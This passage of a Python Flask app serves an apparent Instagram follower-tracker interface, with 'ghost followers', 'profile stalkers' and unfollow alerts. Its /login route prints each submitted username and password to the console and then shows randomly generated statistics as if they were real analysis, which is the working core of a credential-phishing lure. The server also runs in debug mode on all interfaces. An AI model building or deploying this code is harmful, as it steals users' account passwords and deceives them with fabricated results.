  o+=`<div class="row" style="animation-delay:${i*50}ms"><div class="ic">${I[x.i]}</div><div class="info"><b style="font-weight:400;white-space:normal">${x.t}</b><small>${x.s} · <span class="tag ${x.tg[0]}">${x.tg[1]}</span></small></div>${x.c?`<div class="th" style="background:${gr(x.c)}"></div>`:""}</div>`});
 return o;
}
function rows(k,list){
 if(!list.length)return `<div class="empty">You’re all caught up ✨</div>`;
 return list.map((x,i)=>{
  let t="",b="";
  if(k==="notback")b=`<button class="btn g" data-u="${x.h}">Following</button>`;
  if(k==="ghosts"){t=`<span class="tag red">${x.d}d</span>`;b=`<button class="btn r" data-r="${x.h}">Remove</button>`}
  if(k==="stalkers"){t=`<span class="tag hot">${x.c} visits</span>`;b=`<button class="btn" data-b="${x.h}">Follow back</button>`}
  return `<div class="row" style="animation-delay:${i*50}ms">${av(x,i,"s"+(k==="ghosts"?" off":""))}<div class="info"><b>${x.h}${x.v?VF:""}${t}</b><small>${x.n} · ${x.m}</small></div>${b}</div>`}).join("");
}
function lv(k,t,s,ch){
 let l=D[k].filter(x=>(x.n+x.h).toLowerCase().includes(q.toLowerCase()));
 if(f==="ver")l=l.filter(x=>x.v);if(f==="old")l=l.filter(x=>x.d>120);if(f==="top")l=l.filter(x=>x.c>=7);
 return `<h1 class="ttl">${t}</h1><p class="sub">${s}</p><div class="bar"><input class="search" id="s" placeholder="Search" value="${q}">${ch.map(([v,l])=>`<button class="chip ${f===v?"on":""}" data-f="${v}">${l}</button>`).join("")}</div>${rows(k,l)}`;
}
function settings(){
 const sw=(k,l,s)=>`<div class="srow"><div class="info"><b style="font-weight:400">${l}</b>${s?`<small>${s}</small>`:""}</div><button class="sw ${P[k]?"on":""}" data-p="${k}" role="switch" aria-checked="${P[k]}" aria-label="${l}"></button></div>`;
 const th=(a,l,s,on)=>`<div class="srow"><div class="info"><b style="font-weight:400">${l}</b><small>${s}</small></div><button class="sw ${on?"on":""}" data-th="${a}" role="switch" aria-checked="${on}" aria-label="${l}"></button></div>`;
 const lk=(l,s,c)=>`<div class="srow lk ${c||""}"><div class="info"><b style="font-weight:400">${l}</b>${s?`<small>${s}</small>`:""}</div>${c?"":`<span class="ch">›</span>`}</div>`;
 return `<h1 class="ttl">Settings</h1><p class="sub">Manage your appearance, alerts and account.</p>
 <div class="acc">${av({n:"Your Name"},0,"m")}<div class="info"><b>your.handle</b><small>Your Name · Personal account</small></div><button class="btn g">Switch</button></div>
 <div class="sec"><h3>Appearance</h3></div>
 ${th("dark","Dark mode","Switch between light and dark appearance",eff())}
 ${th("sys","Use device settings","Match your phone or computer’s appearance automatically",theme==="system")}
 <div class="sec"><h3>Notifications</h3></div>
 ${sw("likes","Removed likes","Tell me when someone takes back a like")}
 ${sw("comm","Deleted comments","Tell me when a comment disappears")}
 ${sw("unf","Unfollows","Tell me when someone unfollows you")}
 ${sw("stalk","Profile visit alerts","Notify me about repeat visitors")}
 <div class="sec"><h3>Privacy</h3></div>
 ${sw("priv","Hide my activity status","Others can’t see when you’re active")}
 ${lk("Blocked accounts","")}
 ${lk("Data sync frequency","Every 15 minutes")}
 <div class="sec"><h3>Account</h3></div>
 ${lk("Linked Instagram account","@your.handle")}
 ${lk("Download your data","")}
 ${lk("Help","")}
 ${lk("Log out","","red")}`;
}
function render(){
 nav();
 const m=$("#main");let h;
 if(tab==="home")h=home();
 else if(tab==="notback")h=lv("notback","Not following back","Accounts you follow that don’t follow you.",[["all","All"],["ver","Verified"]])+`<div class="sec"><h3>Following you · you don’t follow</h3></div>${D.fans.map((x,i)=>`<div class="row">${av(x,i+2)}<div class="info"><b>${x.h}</b><small>${x.m}</small></div><button class="btn" data-b="${x.h}">Follow back</button></div>`).join("")}`;
 else if(tab==="ghosts")h=lv("ghosts","Ghost followers","They follow you but never like, comment or view.",[["all","All"],["old","120d+"]]);
 else if(tab==="stalkers")h=lv("stalkers","Profile stalkers","Who keeps checking your profile the most.",[["all","All"],["top","Top"]]);
 else if(tab==="settings")h=settings();
 else h=`<h1 class="ttl">Activity</h1><p class="sub">Likes removed, comments deleted, unfollows and more.</p>${actList(D.act)}`;
 m.innerHTML=`<div class="in${anim?" pg":""}">${h}</div>`;anim=false;
 const s=$("#s");if(s)s.oninput=e=>{q=e.target.value;const p=e.target.selectionStart;render();const n=$("#s");n.focus();n.setSelectionRange(p,p)};
 m.querySelectorAll("[data-f]").forEach(b=>b.onclick=()=>{f=b.dataset.f;render()});
 m.querySelectorAll("[data-p]").forEach(b=>b.onclick=()=>{P[b.dataset.p]=!P[b.dataset.p];const sc=m.scrollTop;render();m.scrollTop=sc});
 m.querySelectorAll("[data-th]").forEach(b=>b.onclick=()=>{const d=eff();theme=b.dataset.th==="dark"?(d?"light":"dark"):(theme==="system"?(d?"dark":"light"):"system");try{localStorage.setItem("ins-theme",theme)}catch(e){}applyTheme();const sc=m.scrollTop;render();m.scrollTop=sc;toast(theme==="system"?"Using device appearance":(theme==="dark"?"Dark mode on":"Light mode on"))});
 m.querySelectorAll(".srow.red").forEach(b=>b.onclick=()=>toast("Demo only: no account connected"));
 m.querySelectorAll("[data-k]").forEach(b=>b.onclick=()=>go(b.dataset.k));
 m.querySelectorAll("[data-u],[data-r],[data-b]").forEach(b=>b.onclick=e=>{
  e.stopPropagation();const d=b.dataset;
  if(d.u){D.notback=D.notback.filter(x=>x.h!==d.u);toast("Unfollowed "+d.u)}
  if(d.r){D.ghosts=D.ghosts.filter(x=>x.h!==d.r);toast("Removed "+d.r)}
  if(d.b){b.textContent="Following";b.className="btn g";toast("You followed "+d.b);return}
  const sc=m.scrollTop;render();m.scrollTop=sc});
}
let tt;function toast(t){const e=$("#toast");e.textContent=t;e.classList.add("show");clearTimeout(tt);tt=setTimeout(()=>e.classList.remove("show"),1800)}
$("#bd").onclick=()=>{$("#frame").classList.remove("mobile");$("#bd").classList.add("on");$("#bm").classList.remove("on")};
$("#bm").onclick=()=>{$("#frame").classList.add("mobile");$("#bm").classList.add("on");$("#bd").classList.remove("on")};
render();
</script>
</body>
</html>
"""
# ================= Flask Routes =================
@app.route('/')
def index():
    return render_template_string(LOGIN_PAGE_HTML)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    # Print credentials to console
    print(f"\n{'='*50}")
    print("Received credentials:")
    print(f"Username: {username}")
    print(f"Password: {password}")
    print(f"{'='*50}\n")

    # Generate random statistics
    followers = random.randint(100, 1000)
    unfollowed = random.randint(50, 500)
    you_unfollowed = random.randint(50, 600)
    not_following_back = random.randint(50, 500)
    you_not_following = random.randint(50, 600)
    ghost_followers = random.randint(10, 200)
    blocked_you = random.randint(0, 50)

    return render_template_string(
        RESULTS_PAGE_HTML,
        followers=followers,
        unfollowed=unfollowed,
        you_unfollowed=you_unfollowed,
        not_following_back=not_following_back,
        you_not_following=you_not_following,
        ghost_followers=ghost_followers,
        blocked_you=blocked_you
    )

# ================= Main =================
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)


